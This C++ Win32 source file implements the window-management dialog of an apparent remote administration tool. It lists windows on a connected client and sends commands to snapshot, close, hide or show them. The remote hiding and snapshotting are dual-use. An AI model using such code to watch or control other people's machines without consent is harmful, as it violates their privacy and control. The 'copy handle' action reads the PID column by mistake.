#include "WindowDialog.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../StringUtils.h"
#include "../../Common/Config.h"
#include "../resource.h"
#include "../Utils/StringHelper.h"
#include <CommCtrl.h>
#include <map>
#include <vector>

INT_PTR CALLBACK WindowDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        
        // 设置窗口图标
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_WINDOW)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_WINDOW)));
        
        HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"窗口标题"; lvc.cx = 250; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"句柄";     lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"PID";      lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"类名";     lvc.cx = 150; SendMessageW(hList, LVM_INSERTCOLUMNW, 3, (LPARAM)&lvc);
        
        // 初始化时刷新窗口列表
        SendMessage(hDlg, WM_COMMAND, IDM_WINDOW_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int width = rc.right - rc.left;
        int height = rc.bottom - rc.top;
        
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_WINDOW), 5, 5, width - 10, height - 10, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_WINDOW) {
            if (nm->code == NM_RCLICK) {
                // ... (existing menu code)
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_REFRESH, L"刷新列表(&R)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_CLOSE, L"关闭窗口(&C)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_MAX, L"最大化窗口(&X)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_MIN, L"最小化窗口(&N)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_RESTORE, L"还原窗口(&E)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_HIDE, L"隐藏窗口(&H)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_SHOW, L"显示窗口(&S)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_COPY_TITLE, L"复制标题(&T)");
                AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_COPY_HWND, L"复制句柄(&W)");

                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            } else if (nm->code == LVN_ITEMCHANGED) {
                LPNMLISTVIEW pnmv = (LPNMLISTVIEW)lParam;
                if ((pnmv->uChanged & LVIF_STATE) && (pnmv->uNewState & LVIS_SELECTED)) {
                    uint32_t clientId = dlgToClientId[hDlg];
                    std::shared_ptr<Formidable::ConnectedClient> client;
                    {
                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        if (g_Clients.count(clientId)) client = g_Clients[clientId];
                    }
                    if (client) {
                        uint64_t hwnd = (uint64_t)pnmv->lParam;
                        Formidable::CommandPkg pkg = { 0 };
                        pkg.cmd = Formidable::CMD_WINDOW_SNAPSHOT;
                        pkg.arg1 = (uint32_t)(hwnd & 0xFFFFFFFF);
                        size_t bodySize = sizeof(Formidable::CommandPkg);
                        std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                        Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                        memcpy(header->flag, "FRMD26?", 7);
                        header->originLen = (int)bodySize;
                        header->totalLen = (int)buffer.size();
                        memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                        SendDataToClient(client, buffer.data(), (int)buffer.size());
                    }
                }
            } else if (nm->code == LVN_COLUMNCLICK) {
                LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
                HWND hList = pnmlv->hdr.hwndFrom;
                
                if (!g_SortInfo.count(hList)) {
                    g_SortInfo[hList] = { 0, true, hList };
                }
                
                if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                    g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
                } else {
                    g_SortInfo[hList].column = pnmlv->iSubItem;
                    g_SortInfo[hList].ascending = true;
                }
                
                ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
            }
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        auto SendWinCtrl = [&](uint32_t action) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = index;
                if (ListView_GetItem(hList, &lvi)) {
                    uint64_t hwnd = (uint64_t)lvi.lParam;
                    Formidable::CommandPkg pkg = { 0 };
                    pkg.cmd = Formidable::CMD_WINDOW_CTRL;
                    pkg.arg1 = (uint32_t)(hwnd & 0xFFFFFFFF);
                    pkg.arg2 = action;
                    size_t bodySize = sizeof(Formidable::CommandPkg);
                    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                    memcpy(header->flag, "FRMD26?", 7);
                    header->originLen = (int)bodySize;
                    header->totalLen = (int)buffer.size();
                    memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                    SendDataToClient(client, buffer.data(), (int)buffer.size());
                }
            }
        };

        if (LOWORD(wParam) == IDC_BTN_WINDOW_REFRESH || LOWORD(wParam) == IDM_WINDOW_REFRESH) {
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = Formidable::CMD_WINDOW_LIST;
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_CLOSE || LOWORD(wParam) == IDM_WINDOW_CLOSE) {
            SendWinCtrl(1);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_MAX || LOWORD(wParam) == IDM_WINDOW_MAX) {
            SendWinCtrl(2);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_MIN || LOWORD(wParam) == IDM_WINDOW_MIN) {
            SendWinCtrl(3);
        } else if (LOWORD(wParam) == IDM_WINDOW_RESTORE) {
            SendWinCtrl(4);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_HIDE || LOWORD(wParam) == IDM_WINDOW_HIDE) {
            SendWinCtrl(5);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_SHOW || LOWORD(wParam) == IDM_WINDOW_SHOW) {
            SendWinCtrl(6);
        } else if (LOWORD(wParam) == IDM_WINDOW_COPY_TITLE) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szTitle[512] = { 0 };
                LVITEMW lviTitle = { 0 };
                lviTitle.iSubItem = 0;
                lviTitle.pszText = szTitle;
                lviTitle.cchTextMax = 512;
                SendMessageW(hList, LVM_GETITEMTEXTW, index, (LPARAM)&lviTitle);
                if (wcslen(szTitle) > 0) {
                    if (OpenClipboard(hDlg)) {
                        EmptyClipboard();
                        size_t size = (wcslen(szTitle) + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, szTitle, size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                    }
                }
            }
        } else if (LOWORD(wParam) == IDM_WINDOW_COPY_HWND) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szHwnd[64] = { 0 };
                LVITEMW lviHwnd = { 0 };
                lviHwnd.iSubItem = 2;
                lviHwnd.pszText = szHwnd;
                lviHwnd.cchTextMax = 64;
                SendMessageW(hList, LVM_GETITEMTEXTW, index, (LPARAM)&lviHwnd);
                if (wcslen(szHwnd) > 0) {
                    if (OpenClipboard(hDlg)) {
                        EmptyClipboard();
                        size_t size = (wcslen(szHwnd) + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, szHwnd, size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                    }
                }
            }
        } else if (LOWORD(wParam) == IDCANCEL) {
            SendMessage(hDlg, WM_CLOSE, 0, 0);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (g_WindowPreviews.count(hDlg)) {
            HBITMAP hOld = g_WindowPreviews[hDlg];
            if (hOld) DeleteObject(hOld);
            g_WindowPreviews.erase(hDlg);
        }
        if (dlgToClientId.count(hDlg)) {
            uint32_t clientId = dlgToClientId[hDlg];
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) {
                g_Clients[clientId]->hWindowDlg = NULL;
            }
            dlgToClientId.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}
